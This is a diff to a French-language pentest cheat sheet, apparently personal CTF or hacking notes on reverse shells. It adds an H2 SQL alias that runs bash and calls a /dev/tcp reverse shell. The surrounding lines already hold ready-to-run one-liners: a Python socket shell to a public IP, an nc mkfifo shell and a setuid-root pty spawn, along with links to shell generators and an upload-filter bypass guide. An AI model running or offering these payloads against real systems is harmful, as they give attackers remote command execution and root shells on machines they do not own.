@@ -13,12 +13,20 @@
 - https://www.revshells.com/
 - Par internet --> https://dashboard.ngrok.com/get-started/setup
 
-- [Reverse shell assisté](https://github.com/t0thkr1s/revshellgen)
 - [Liste en plusieurs language Reverse shell](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
 	- `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.253.72.139",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
 	- Spawn a meilleur shell --> `python -c 'import pty;pty.spawn ("/bin/bash")'` ou `python3 -c 'import pty;pty.spawn ("/bin/bash")'`
 	- Spawn un shell root --> `python3 -c 'import pty,os; os.setuid(0);os.setgid(0);pty.spawn("/bin/bash")'`
 	- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.1 1234 >/tmp/f`
+
+ - Reverse shell via SQL :
+```sql
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+    String[] command = {"bash", "-c", cmd};
+    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+    return s.hasNext() ? s.next() : "";  }$$;
+CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
+```
 
 - [Bypass extension](https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html)
 
